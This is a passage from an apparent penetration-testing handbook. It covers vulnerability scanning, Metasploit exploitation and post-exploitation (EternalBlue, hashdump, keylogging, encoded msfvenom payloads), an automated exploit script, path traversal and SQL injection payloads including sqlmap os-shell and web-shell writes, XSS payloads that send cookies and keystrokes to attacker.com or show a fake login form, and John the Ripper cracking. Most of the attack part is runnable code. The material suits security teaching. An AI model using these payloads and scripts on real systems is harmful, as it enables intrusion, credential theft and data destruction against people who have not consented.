                        'cvss_v3': cvss_v3.get('cvssData', {}),
                        'severity': cvss_v3.get('cvssData', {}).get('baseSeverity'),
                        'published': cve_data.get('published'),
                        'last_modified': cve_data.get('lastModified'),
                        'cwe': cwe_ids,
                        'references': ref_urls,
                        'configurations': configurations
                    }
        
        except Exception as e:
            print(f"Error getting CVE details: {e}")
            return {}
    
    def analyze_software_vulnerabilities(self, software_name: str, version: str = None) -> dict:
        """
        Find vulnerabilities for specific software
        """
        search_term = f"{software_name} {version}" if version else software_name
        
        vulnerabilities = self.search_cve(search_term, days_back=365)
        
        # Categorize by severity
        by_severity = {
            'CRITICAL': [],
            'HIGH': [],
            'MEDIUM': [],
            'LOW': [],
            'NONE': []
        }
        
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'NONE')
            by_severity[severity].append(vuln)
        
        # Generate risk assessment
        risk_score = (
            len(by_severity['CRITICAL']) * 10 +
            len(by_severity['HIGH']) * 7 +
            len(by_severity['MEDIUM']) * 4 +
            len(by_severity['LOW']) * 1
        )
        
        return {
            'software': software_name,
            'version': version,
            'total_vulnerabilities': len(vulnerabilities),
            'by_severity': {k: len(v) for k, v in by_severity.items()},
            'risk_score': risk_score,
            'critical_cves': [v['cve_id'] for v in by_severity['CRITICAL']],
            'vulnerabilities': vulnerabilities
        }
    
    def generate_report(self, software_list: list) -> str:
        """
        Generate vulnerability assessment report
        """
        report = "\n" + "="*60 + "\n"
        report += "Vulnerability Assessment Report\n"
        report += "="*60 + "\n\n"
        report += f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        
        total_vulns = 0
        total_critical = 0
        total_high = 0
        
        for software in software_list:
            name = software.get('name')
            version = software.get('version')
            
            print(f"[*] Analyzing {name} {version}...")
            results = self.analyze_software_vulnerabilities(name, version)
            
            total_vulns += results['total_vulnerabilities']
            total_critical += results['by_severity']['CRITICAL']
            total_high += results['by_severity']['HIGH']
            
            report += f"Software: {name} {version}\n"
            report += f"{'─'*60}\n"
            report += f"Total Vulnerabilities: {results['total_vulnerabilities']}\n"
            report += f"Risk Score: {results['risk_score']}\n"
            report += f"Severity Breakdown:\n"
            report += f"  CRITICAL: {results['by_severity']['CRITICAL']}\n"
            report += f"  HIGH: {results['by_severity']['HIGH']}\n"
            report += f"  MEDIUM: {results['by_severity']['MEDIUM']}\n"
            report += f"  LOW: {results['by_severity']['LOW']}\n"
            
            if results['critical_cves']:
                report += f"\nCritical CVEs:\n"
                for cve in results['critical_cves']:
                    report += f"  - {cve}\n"
            
            report += "\n"
        
        report += "="*60 + "\n"
        report += "Summary\n"
        report += "="*60 + "\n"
        report += f"Total Software Analyzed: {len(software_list)}\n"
        report += f"Total Vulnerabilities: {total_vulns}\n"
        report += f"Critical: {total_critical}\n"
        report += f"High: {total_high}\n"
        
        return report

# Example usage
if __name__ == "__main__":
    intel = VulnerabilityIntelligence()
    
    # Example: Search recent WordPress vulnerabilities
    print("[*] Searching for WordPress vulnerabilities...")
    wordpress_vulns = intel.search_cve("WordPress", days_back=90)
    
    print(f"\n[+] Found {len(wordpress_vulns)} WordPress vulnerabilities in last 90 days\n")
    for vuln in wordpress_vulns[:5]:  # Show first 5
        print(f"CVE: {vuln['cve_id']}")
        print(f"Severity: {vuln['severity']} (CVSS: {vuln['cvss_score']})")
        print(f"Description: {vuln['description'][:100]}...")
        print()
    
    # Example: Analyze software stack
    software_stack = [
        {'name': 'nginx', 'version': '1.20.0'},
        {'name': 'php', 'version': '7.4.0'},
        {'name': 'wordpress', 'version': '6.0'}
    ]
    
    report = intel.generate_report(software_stack)
    print(report)
```

### Automated Vulnerability Scanning

**Nessus/OpenVAS Configuration:**

```bash
#!/bin/bash
# OpenVAS Vulnerability Scanner Setup and Usage

# Installation (Ubuntu/Debian)
install_openvas() {
    apt-get update
    apt-get install -y openvas
    
    # Run setup
    gvm-setup
    
    # Create admin user
    gvmd --create-user=admin --password=StrongPassword123
    
    # Start services
    gvm-start
    
    echo "[+] OpenVAS installed and running"
    echo "[+] Access web interface: https://localhost:9392"
}

# Create scan configuration
create_scan_config() {
    local TARGET="$1"
    local SCAN_NAME="$2"
    
    # Using gvm-tools CLI
    gvm-cli socket --xml "<create_target>
        <name>${SCAN_NAME}</name>
        <hosts>${TARGET}</hosts>
    </create_target>"
    
    # Create task
    gvm-cli socket --xml "<create_task>
        <name>${SCAN_NAME}</name>
        <target id='TARGET_ID'/>
        <config id='daba56c8-73ec-11df-a475-002264764cea'/>
        <scanner id='08b69003-5fc2-4037-a479-93b440211c73'/>
    </create_task>"
}

# Run authenticated scan
run_authenticated_scan() {
    cat > /tmp/scan_config.xml << 'EOF'
<create_target>
    <name>Authenticated Web Scan</name>
    <hosts>192.168.1.100</hosts>
    <port_list id="33d0cd82-57c6-11e1-8ed1-406186ea4fc5"/>
    <ssh_credential id="CREDENTIAL_ID"/>
</create_target>
EOF
    
    gvm-cli socket --xml "$(cat /tmp/scan_config.xml)"
}

# Alternative: Nikto Web Scanner
run_nikto_scan() {
    local TARGET="$1"
    
    nikto -h "$TARGET" \
        -output "nikto_${TARGET}.html" \
        -Format html \
        -Tuning 123456789ab \
        -Display 1234E
}

# Alternative: Nuclei Template-based Scanner
run_nuclei_scan() {
    local TARGET="$1"
    
    # Update templates
    nuclei -update-templates
    
    # Run comprehensive scan
    nuclei -u "$TARGET" \
        -t ~/nuclei-templates/ \
        -severity critical,high,medium \
        -o "nuclei_${TARGET}.txt" \
        -json -o "nuclei_${TARGET}.json"
}

echo "OpenVAS and alternative scanners configured"
```

**Custom Vulnerability Scanner:**

```python
#!/usr/bin/env python3
"""
Custom Vulnerability Scanner
"""
import requests
import socket
import ssl
from urllib.parse import urljoin
from typing import List, Dict

class VulnerabilityScanner:
    def __init__(self, target_url: str):
        self.target = target_url
        self.vulnerabilities = []
    
    def check_security_headers(self) -> List[Dict]:
        """
        Check for missing security headers
        """
        vulns = []
        
        try:
            response = requests.get(self.target, timeout=10)
            headers = response.headers
            
            # Required security headers
            required_headers = {
                'X-Frame-Options': 'Missing clickjacking protection',
                'X-Content-Type-Options': 'Missing MIME sniffing protection',
                'Strict-Transport-Security': 'Missing HSTS',
                'Content-Security-Policy': 'Missing CSP',
                'X-XSS-Protection': 'Missing XSS protection'
            }
            
            for header, description in required_headers.items():
                if header not in headers:
                    vulns.append({
                        'type': 'Missing Security Header',
                        'severity': 'MEDIUM',
                        'header': header,
                        'description': description,
                        'remediation': f'Add {header} header to server configuration'
                    })
        
        except Exception as e:
            print(f"Error checking headers: {e}")
        
        return vulns
    
    def check_ssl_tls(self) -> List[Dict]:
        """
        Check SSL/TLS configuration
        """
        vulns = []
        
        try:
            hostname = self.target.replace('https://', '').replace('http://', '').split('/')[0]
            context = ssl.create_default_context()
            
            with socket.create_connection((hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    # Get certificate
                    cert = ssock.getpeercert()
                    
                    # Check protocol version
                    version = ssock.version()
                    if version in ['TLSv1', 'TLSv1.1', 'SSLv2', 'SSLv3']:
                        vulns.append({
                            'type': 'Weak TLS Version',
                            'severity': 'HIGH',
                            'version': version,
                            'description': f'Server supports outdated {version}',
                            'remediation': 'Disable TLS 1.0/1.1, use TLS 1.2 or 1.3 only'
                        })
                    
                    # Check cipher suite
                    cipher = ssock.cipher()
                    weak_ciphers = ['RC4', 'DES', 'MD5', 'NULL']
                    
                    if any(weak in cipher[0] for weak in weak_ciphers):
                        vulns.append({
                            'type': 'Weak Cipher Suite',
                            'severity': 'HIGH',
                            'cipher': cipher[0],
                            'description': 'Server supports weak cipher suites',
                            'remediation': 'Configure strong cipher suites only'
                        })
        
        except Exception as e:
            print(f"Error checking SSL/TLS: {e}")
        
        return vulns
    
    def check_information_disclosure(self) -> List[Dict]:
        """
        Check for information disclosure
        """
        vulns = []
        
        try:
            response = requests.get(self.target, timeout=10)
            
            # Check Server header
            server = response.headers.get('Server', '')
            if server and any(version_indicator in server for version_indicator in ['/', '(', ')']):
                vulns.append({
                    'type': 'Server Version Disclosure',
                    'severity': 'LOW',
                    'server': server,
                    'description': 'Server version information disclosed',
                    'remediation': 'Remove version information from Server header'
                })
            
            # Check for error messages with stack traces
            error_indicators = [
                'stack trace',
                'error in line',
                'Warning:',
                'Fatal error:',
                'mysql_',
                'ORA-',
                'PostgreSQL',
                'Traceback (most recent call last)'
            ]
            
            for indicator in error_indicators:
                if indicator.lower() in response.text.lower():
                    vulns.append({
                        'type': 'Error Message Disclosure',
                        'severity': 'MEDIUM',
                        'indicator': indicator,
                        'description': 'Application error messages disclosed',
                        'remediation': 'Configure custom error pages, disable debug mode'
                    })
                    break
        
        except Exception as e:
            print(f"Error checking information disclosure: {e}")
        
        return vulns
    
    def check_common_files(self) -> List[Dict]:
        """
        Check for common sensitive files
        """
        vulns = []
        
        common_files = [
            '/.git/config',
            '/.env',
            '/config.php',
            '/wp-config.php',
            '/.htaccess',
            '/web.config',
            '/composer.json',
            '/package.json',
            '/robots.txt',
            '/.DS_Store',
            '/backup.zip',
            '/database.sql',
            '/.svn/entries',
            '/admin',
            '/phpmyadmin'
        ]
        
        for file_path in common_files:
            try:
                url = urljoin(self.target, file_path)
                response = requests.get(url, timeout=5)
                
                if response.status_code == 200:
                    vulns.append({
                        'type': 'Sensitive File Exposed',
                        'severity': 'HIGH' if any(s in file_path for s in ['.git', '.env', 'config']) else 'MEDIUM',
                        'file': file_path,
                        'description': f'Sensitive file accessible: {file_path}',
                        'remediation': f'Remove or restrict access to {file_path}'
                    })
            
            except:
                pass
        
        return vulns
    
    def check_http_methods(self) -> List[Dict]:
        """
        Check for dangerous HTTP methods
        """
        vulns = []
        
        try:
            response = requests.options(self.target, timeout=10)
            allow_header = response.headers.get('Allow', '')
            
            dangerous_methods = ['PUT', 'DELETE', 'TRACE', 'CONNECT']
            
            for method in dangerous_methods:
                if method in allow_header:
                    vulns.append({
                        'type': 'Dangerous HTTP Method',
                        'severity': 'MEDIUM',
                        'method': method,
                        'description': f'HTTP {method} method is enabled',
                        'remediation': f'Disable {method} method if not required'
                    })
        
        except Exception as e:
            print(f"Error checking HTTP methods: {e}")
        
        return vulns
    
    def check_directory_listing(self) -> List[Dict]:
        """
        Check for directory listing
        """
        vulns = []
        
        try:
            response = requests.get(self.target, timeout=10)
            
            listing_indicators = [
                'Index of /',
                'Directory listing for',
                'Parent Directory',
                '<title>Index of'
            ]
            
            if any(indicator in response.text for indicator in listing_indicators):
                vulns.append({
                    'type': 'Directory Listing Enabled',
                    'severity': 'MEDIUM',
                    'description': 'Directory listing is enabled',
                    'remediation': 'Disable directory listing in web server configuration'
                })
        
        except Exception as e:
            print(f"Error checking directory listing: {e}")
        
        return vulns
    
    def scan(self) -> List[Dict]:
        """
        Run all vulnerability checks
        """
        print(f"[*] Scanning {self.target}...")
        
        all_vulns = []
        
        # Run all checks
        checks = [
            ('Security Headers', self.check_security_headers),
            ('SSL/TLS', self.check_ssl_tls),
            ('Information Disclosure', self.check_information_disclosure),
            ('Common Files', self.check_common_files),
            ('HTTP Methods', self.check_http_methods),
            ('Directory Listing', self.check_directory_listing)
        ]
        
        for check_name, check_func in checks:
            print(f"[+] Running {check_name} check...")
            try:
                vulns = check_func()
                all_vulns.extend(vulns)
            except Exception as e:
                print(f"[-] Error in {check_name}: {e}")
        
        self.vulnerabilities = all_vulns
        return all_vulns
    
    def generate_report(self) -> str:
        """
        Generate vulnerability report
        """
        if not self.vulnerabilities:
            self.scan()
        
        # Sort by severity
        severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
        sorted_vulns = sorted(
            self.vulnerabilities,
            key=lambda x: severity_order.get(x['severity'], 4)
        )
        
        # Count by severity
        by_severity = {}
        for vuln in sorted_vulns:
            severity = vuln['severity']
            by_severity[severity] = by_severity.get(severity, 0) + 1
        
        # Generate report
        report = "\n" + "="*60 + "\n"
        report += f"Vulnerability Scan Report: {self.target}\n"
        report += "="*60 + "\n\n"
        
        report += "Summary:\n"
        report += f"Total Vulnerabilities: {len(sorted_vulns)}\n"
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            count = by_severity.get(severity, 0)
            if count > 0:
                report += f"  {severity}: {count}\n"
        
        report += "\n" + "-"*60 + "\n\n"
        
        # List vulnerabilities
        for i, vuln in enumerate(sorted_vulns, 1):
            report += f"{i}. [{vuln['severity']}] {vuln['type']}\n"
            report += f"   Description: {vuln['description']}\n"
            report += f"   Remediation: {vuln['remediation']}\n"
            
            # Add any additional details
            for key, value in vuln.items():
                if key not in ['type', 'severity', 'description', 'remediation']:
                    report += f"   {key.title()}: {value}\n"
            
            report += "\n"
        
        return report

# Example usage
if __name__ == "__main__":
    scanner = VulnerabilityScanner("https://example.com")
    
    # Run scan
    vulnerabilities = scanner.scan()
    
    # Generate and print report
    report = scanner.generate_report()
    print(report)
    
    # Save to file
    with open("vulnerability_report.txt", "w") as f:
        f.write(report)
    
    print(f"\n[+] Report saved to vulnerability_report.txt")
```

[Continuing with exploitation fundamentals, Metasploit, and web application security...]
## 2.3 Exploitation Fundamentals & Metasploit Framework

Exploitation is the process of taking advantage of vulnerabilities to gain unauthorized access or execute arbitrary code.

### Metasploit Framework Complete Guide

Metasploit is the world's most used penetration testing framework.

**Metasploit Architecture:**

```
┌─────────────────────────────────────────┐
│         Metasploit Framework            │
├─────────────────────────────────────────┤
│  Interfaces: msfconsole, msfgui, Web    │
├─────────────────────────────────────────┤
│  Libraries: Rex, Core, Base             │
├─────────────────────────────────────────┤
│  Modules:                                │
│  - Exploits    - Post                   │
│  - Payloads    - Encoders               │
│  - Auxiliary   - NOPs                   │
├─────────────────────────────────────────┤
│  Plugins & Tools                        │
└─────────────────────────────────────────┘
```

**Comprehensive Metasploit Usage:**

```bash
#!/bin/bash
# Metasploit Complete Workflow

# Start PostgreSQL database
systemctl start postgresql

# Initialize Metasploit database
msfdb init

# Launch msfconsole
msfconsole

# Inside msfconsole:
```

```ruby
# MSF Console Commands

# Database management
db_status                          # Check database connection
workspace                          # List workspaces
workspace -a pentest_2024          # Create new workspace
workspace pentest_2024             # Switch workspace
db_nmap -sV -p- 192.168.1.0/24    # Run Nmap and import results
hosts                              # List discovered hosts
services                           # List discovered services
vulns                              # List vulnerabilities

# Searching for exploits
search type:exploit platform:windows smb
search cve:2024-1234
search eternalblue
search apache                      # Search for Apache exploits

# Module information
info exploit/windows/smb/ms17_010_eternalblue
show options                       # Show module options
show payloads                      # Show compatible payloads
show targets                       # Show available targets

# Using an exploit module
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set RPORT 445
set LHOST 192.168.1.50             # Your IP for reverse connection
set LPORT 4444
show options                       # Verify configuration

# Select payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp
show advanced                      # Advanced options
set AutoRunScript post/windows/gather/enum_system

# Check if target is vulnerable
check                              # Some modules support this

# Execute exploit
exploit
# Or: run
# Or: exploit -j  (run as job)

# If successful, you'll get a Meterpreter session

# Meterpreter Commands (post-exploitation)
sysinfo                            # System information
getuid                             # Current user
ps                                 # Process list
migrate <PID>                      # Migrate to another process
hashdump                           # Dump password hashes
screenshot                         # Capture screenshot
keyscan_start                      # Start keylogger
keyscan_dump                       # Dump keystrokes
webcam_snap                        # Take webcam photo

# Privilege escalation
getsystem                          # Attempt automatic privilege escalation
background                         # Background current session

# Session management (from msfconsole)
sessions                           # List active sessions
sessions -i 1                      # Interact with session 1
sessions -K                        # Kill all sessions

# Post-exploitation modules
use post/windows/gather/enum_shares
set SESSION 1
run

use post/windows/gather/credentials/credential_collector
set SESSION 1
run

# Pivoting - route through compromised host
route add 10.10.10.0 255.255.255.0 1  # Add route through session 1
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 445,3389,22
run

# Generate standalone payloads
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 LPORT=4444 \
    -f exe -o payload.exe

# Evasion
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 LPORT=4444 \
    -e x86/shikata_ga_nai -i 10 \      # Encode 10 iterations
    -f exe -o encoded_payload.exe

# Resource scripts (automation)
makerc /root/pentest.rc            # Save current commands
resource /root/pentest.rc          # Replay commands
```

**Metasploit Automation Script:**

```python
#!/usr/bin/env python3
"""
Metasploit Automation using pymetasploit3
"""
from pymetasploit3.msfrpc import MsfRpcClient

class MetasploitAutomation:
    def __init__(self, password='msf'):
        """Connect to Metasploit RPC"""
        self.client = MsfRpcClient(password=password, port=55553)
        self.console = self.client.consoles.console()
    
    def execute_command(self, command):
        """Execute MSF console command"""
        self.console.write(command)
        
        # Wait for command to complete
        while self.console.is_busy():
            time.sleep(1)
        
        return self.console.read()
    
    def db_nmap_scan(self, target):
        """Run Nmap scan and import to Metasploit DB"""
        print(f"[*] Scanning {target}...")
        result = self.execute_command(f"db_nmap -sV -p- {target}")
        print(result['data'])
        
        # Get discovered hosts
        hosts = self.execute_command("hosts -c address,os_name")
        return hosts
    
    def search_exploits(self, search_term):
        """Search for exploits"""
        modules = self.client.modules.search(search_term)
        return modules
    
    def run_exploit(self, exploit_path, options):
        """
        Run an exploit module
        
        options = {
            'RHOSTS': '192.168.1.100',
            'RPORT': 445,
            'LHOST': '192.168.1.50',
            'LPORT': 4444
        }
        """
        print(f"[*] Running exploit: {exploit_path}")
        
        # Load exploit module
        exploit = self.client.modules.use('exploit', exploit_path)
        
        # Set options
        for key, value in options.items():
            exploit[key] = value
        
        # Execute
        result = exploit.execute(payload='windows/x64/meterpreter/reverse_tcp')
        
        return result
    
    def interact_with_session(self, session_id):
        """
        Interact with Meterpreter session
        """
        session = self.client.sessions.session(session_id)
        
        # Run commands
        commands = [
            'sysinfo',
            'getuid',
            'pwd'
        ]
        
        results = {}
        for cmd in commands:
            session.write(cmd)
            results[cmd] = session.read()
        
        return results
    
    def automated_pentest(self, target):
        """
        Automated penetration test workflow
        """
        print(f"[*] Starting automated pentest on {target}")
        
        # 1. Scan
        self.db_nmap_scan(target)
        
        # 2. Search for applicable exploits
        exploits = self.search_exploits('smb')
        
        # 3. Try common exploits
        common_exploits = [
            {
                'path': 'windows/smb/ms17_010_eternalblue',
                'options': {
                    'RHOSTS': target,
                    'LHOST': '192.168.1.50'
                }
            },
            {
                'path': 'windows/smb/ms08_067_netapi',
                'options': {
                    'RHOSTS': target,
                    'LHOST': '192.168.1.50'
                }
            }
        ]
        
        for exploit in common_exploits:
            try:
                result = self.run_exploit(exploit['path'], exploit['options'])
                if result.get('job_id'):
                    print(f"[+] Exploit launched: {exploit['path']}")
            except Exception as e:
                print(f"[-] Exploit failed: {e}")
        
        # 4. Check for active sessions
        sessions = self.client.sessions.list
        print(f"[+] Active sessions: {len(sessions)}")
        
        return sessions

# Example usage
if __name__ == "__main__":
    msf = MetasploitAutomation()
    
    # Automated pentest
    sessions = msf.automated_pentest("192.168.1.100")
    
    # Interact with sessions
    for session_id in sessions.keys():
        results = msf.interact_with_session(session_id)
        print(f"\n[Session {session_id}]")
        print(results)
```

## 2.4 Web Application Security - OWASP Top 10

### A01:2021 – Broken Access Control

**Attack: Insecure Direct Object Reference (IDOR)**

```python
# Vulnerable code
@app.route('/api/user/<user_id>')
def get_user(user_id):
    # ❌ No authorization check!
    user = User.query.get(user_id)
    return jsonify(user.to_dict())

# Attack:
# GET /api/user/1  → Your data
# GET /api/user/2  → Someone else's data!
```

```python
# Secure code
@app.route('/api/user/<user_id>')
@login_required
def get_user(user_id):
    # ✅ Check if user owns this resource
    current_user_id = get_current_user_id()
    
    if str(current_user_id) != user_id:
        abort(403, "Unauthorized")
    
    user = User.query.get(user_id)
    return jsonify(user.to_dict())
```

**IDOR Testing Script:**

```python
#!/usr/bin/env python3
"""
IDOR (Insecure Direct Object Reference) Testing
"""
import requests

class IDORTester:
    def __init__(self, base_url, auth_token):
        self.base_url = base_url
        self.headers = {'Authorization': f'Bearer {auth_token}'}
    
    def test_sequential_ids(self, endpoint, id_range=(1, 100)):
        """
        Test for IDOR by iterating through sequential IDs
        """
        vulnerable_ids = []
        
        for user_id in range(id_range[0], id_range[1]):
            url = f"{self.base_url}/{endpoint}/{user_id}"
            
            try:
                response = requests.get(url, headers=self.headers, timeout=5)
                
                if response.status_code == 200:
                    vulnerable_ids.append({
                        'id': user_id,
                        'data': response.json()
                    })
                    print(f"[!] IDOR found: {url} - {response.status_code}")
            except:
                pass
        
        return vulnerable_ids
    
    def test_uuid_prediction(self, endpoint):
        """
        Test if UUIDs are predictable
        """
        # Collect sample UUIDs
        sample_uuids = []
        
        for _ in range(10):
            response = requests.post(
                f"{self.base_url}/create_resource",
                headers=self.headers
            )
            
            if response.status_code == 201:
                uuid = response.json().get('id')
                sample_uuids.append(uuid)
        
        # Analyze for patterns
        # UUIDs should be random (version 4)
        # Check if sequential or predictable
        
        return self.analyze_uuid_randomness(sample_uuids)
```

**Path Traversal Attack:**

```bash
# Attack examples
curl "http://target.com/download?file=../../../../etc/passwd"
curl "http://target.com/api/file?path=..%2f..%2f..%2fetc%2fpasswd"
curl "http://target.com/image?img=....//....//....//etc/passwd"

# Double encoding
curl "http://target.com/file?path=%252e%252e%252f%252e%252e%252fetc%252fpasswd"

# URL encoding variations
..%c0%af
..%c1%9c
```

### A03:2021 – Injection

**SQL Injection Deep Dive:**

```python
#!/usr/bin/env python3
"""
Advanced SQL Injection Testing and Exploitation
"""

class SQLInjectionTester:
    def __init__(self, target_url):
        self.target = target_url
        self.payloads = self.load_payloads()
    
    def load_payloads(self):
        """SQL injection payloads for different databases"""
        return {
            'error_based': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "admin'--",
                "admin' #",
                "admin'/*",
                "' or 1=1--",
                "' or 1=1#",
                "' or 1=1/*",
                "') or '1'='1--",
                "') or ('1'='1--",
            ],
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL--",
                "' UNION SELECT username,password FROM users--",
                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
            ],
            'boolean_based': [
                "' AND '1'='1",
                "' AND '1'='2",
                "' AND 1=1--",
                "' AND 1=2--",
            ],
            'time_based': [
                "'; WAITFOR DELAY '00:00:05'--",  # SQL Server
                "'; SELECT SLEEP(5)--",           # MySQL
                "'; SELECT pg_sleep(5)--",        # PostgreSQL
            ],
            'stacked_queries': [
                "'; DROP TABLE users--",
                "'; INSERT INTO users VALUES('hacker','password')--",
            ]
        }
    
    def test_injection_point(self, param, value):
        """Test if parameter is vulnerable to SQLi"""
        
        # Test error-based
        for payload in self.payloads['error_based']:
            test_value = value + payload
            response = requests.get(
                self.target,
                params={param: test_value},
                timeout=10
            )
            
            # Check for SQL errors
            sql_errors = [
                'SQL syntax',
                'mysql_fetch',
                'pg_query',
                'ORA-',
                'SQL Server',
                'Microsoft SQL Native Client error'
            ]
            
            for error in sql_errors:
                if error.lower() in response.text.lower():
                    return {
                        'vulnerable': True,
                        'type': 'Error-based SQLi',
                        'payload': payload,
                        'evidence': error
                    }
        
        # Test boolean-based
        true_payload = "' AND '1'='1"
        false_payload = "' AND '1'='2"
        
        true_response = requests.get(
            self.target,
            params={param: value + true_payload}
        )
        
        false_response = requests.get(
            self.target,
            params={param: value + false_payload}
        )
        
        # If responses differ significantly, likely vulnerable
        if len(true_response.text) != len(false_response.text):
            return {
                'vulnerable': True,
                'type': 'Boolean-based blind SQLi',
                'payload': true_payload
            }
        
        return {'vulnerable': False}
    
    def extract_database_info(self, param):
        """
        Extract database information using UNION-based injection
        """
        info = {}
        
        # Determine number of columns
        columns = self.find_column_count(param)
        info['columns'] = columns
        
        # Extract database version
        version_payload = f"' UNION SELECT {'NULL,'*(columns-1)}@@version--"
        response = requests.get(
            self.target,
            params={param: version_payload}
        )
        
        # Parse version from response
        # info['database_version'] = ...
        
        # Extract table names
        tables_payload = f"' UNION SELECT {'NULL,'*(columns-1)}table_name FROM information_schema.tables--"
        
        # Extract column names
        # ...
        
        return info
    
    def find_column_count(self, param):
        """Determine number of columns in query"""
        for i in range(1, 20):
            nulls = ','.join(['NULL'] * i)
            payload = f"' UNION SELECT {nulls}--"
            
            response = requests.get(
                self.target,
                params={param: payload}
            )
            
            # If no error, found correct column count
            if 'error' not in response.text.lower():
                return i
        
        return None

# Usage
tester = SQLInjectionTester("http://target.com/login")
result = tester.test_injection_point('username', 'admin')

if result['vulnerable']:
    print(f"[!] SQL Injection found!")
    print(f"Type: {result['type']}")
    print(f"Payload: {result['payload']}")
```

**SQLMap Automation:**

```bash
#!/bin/bash
# Comprehensive SQLMap Usage

TARGET="http://target.com/login"

# Basic scan
sqlmap -u "$TARGET?id=1" --batch

# With POST data
sqlmap -u "$TARGET" --data="username=admin&password=pass" --batch

# Test all parameters
sqlmap -u "$TARGET?id=1&category=books" -p "*" --batch

# Dump database
sqlmap -u "$TARGET?id=1" --dbs                    # List databases
sqlmap -u "$TARGET?id=1" -D database_name --tables  # List tables
sqlmap -u "$TARGET?id=1" -D database_name -T users --columns  # List columns
sqlmap -u "$TARGET?id=1" -D database_name -T users -C username,password --dump  # Dump data

# With authentication
sqlmap -u "$TARGET" \
    --cookie="PHPSESSID=abc123" \
    --dbs

# OS command execution
sqlmap -u "$TARGET?id=1" --os-shell

# File system access
sqlmap -u "$TARGET?id=1" --file-read="/etc/passwd"
sqlmap -u "$TARGET?id=1" --file-write="/root/shell.php" --file-dest="/var/www/html/shell.php"

# Advanced options
sqlmap -u "$TARGET?id=1" \
    --technique=BEUST \        # Boolean, Error, Union, Stacked, Time-based
    --level=5 \                # Test level (1-5)
    --risk=3 \                 # Risk level (1-3)
    --threads=10 \             # Concurrent threads
    --tamper=space2comment \   # Evasion technique
    --random-agent             # Randomize User-Agent
```

### XSS (Cross-Site Scripting) Advanced

**XSS Payload Examples:**

```javascript
// Stored XSS
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">

// DOM-based XSS
<script>
location.href = 'http://attacker.com/?cookie=' + document.cookie;
</script>

// Bypass filters
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
<svg/onload=alert`XSS`>

// Cookie stealing
<script>
fetch('http://attacker.com/steal.php?cookie=' + document.cookie);
</script>

// Keylogger
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log.php?key=' + e.key);
}
</script>

// Phishing
<script>
document.body.innerHTML = '<form action="http://attacker.com/phish.php">' +
    '<h1>Session Expired - Please Login</h1>' +
    'Username: <input name="user"><br>' +
    'Password: <input type="password" name="pass"><br>' +
    '<input type="submit" value="Login">' +
    '</form>';
</script>
```

**XSS Testing Automation:**

```python
#!/usr/bin/env python3
"""
Comprehensive XSS Testing
"""

class XSSTester:
    def __init__(self, target_url):
        self.target = target_url
        self.payloads = self.load_payloads()
    
    def load_payloads(self):
        """Load XSS test payloads"""
        return {
            'basic': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<iframe src="javascript:alert(1)">',
                '<body onload=alert(1)>',
            ],
            'encoded': [
                '%3Cscript%3Ealert(1)%3C/script%3E',
                '&#60;script&#62;alert(1)&#60;/script&#62;',
                '\u003cscript\u003ealert(1)\u003c/script\u003e',
            ],
            'filter_bypass': [
                '<scr<script>ipt>alert(1)</scr</script>ipt>',
                '<img src=x onerror="alert(1)">',
                '<svg/onload=alert`1`>',
                '<<SCRIPT>alert(1);//<</SCRIPT>',
            ],
            'dom_based': [
                '#<img src=x onerror=alert(1)>',
                'javascript:alert(1)',
            ]
        }
    
    def test_reflected_xss(self, param):
        """Test for reflected XSS"""
        
        for category, payloads in self.payloads.items():
            for payload in payloads:
                # Send payload
                response = requests.get(
                    self.target,
                    params={param: payload},
                    timeout=10
                )
                
                # Check if payload reflected without encoding
                if payload in response.text:
                    # Verify execution context
                    context = self.identify_context(response.text, payload)
                    
                    return {
                        'vulnerable': True,
                        'type': 'Reflected XSS',
                        'parameter': param,
                        'payload': payload,
                        'category': category,
                        'context': context
                    }
        
        return {'vulnerable': False}
    
    def identify_context(self, html, payload):
        """Identify where payload appears in HTML"""
        
        contexts = []
        
        # Check if in HTML body
        if payload in html and '<' in payload:
            contexts.append('HTML')
        
        # Check if in attribute
        if f'value="{payload}"' in html or f"value='{payload}'" in html:
            contexts.append('Attribute')
        
        # Check if in JavaScript
        if f'<script>' in html and payload in html:
            contexts.append('JavaScript')
        
        # Check if in URL
        if f'href="{payload}"' in html or f'src="{payload}"' in html:
            contexts.append('URL')
        
        return contexts
```

[Continue with CSRF, XXE, File Upload, API Security, and remaining web vulnerabilities...]

## 2.5 Password Attacks

### John the Ripper

```bash
# Hash extraction
# Linux
unshadow /etc/passwd /etc/shadow > hashes.txt

# Windows
# Use pwdump, fgdump, or mimikatz

# Basic cracking
john hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Format-specific cracking
john --format=NT hashes.txt              # NTLM
john --format=raw-md5 hashes.txt         # MD5
john --format=raw-sha256 hashes.txt      # SHA-256

# Incremental mode (brute force)
john --incremental hashes.txt

# Custom rules
john --rules=Jumbo --wordlist=wordlist.txt hashes.txt
```

### Hashcat

```bash
# NTLM hash cracking
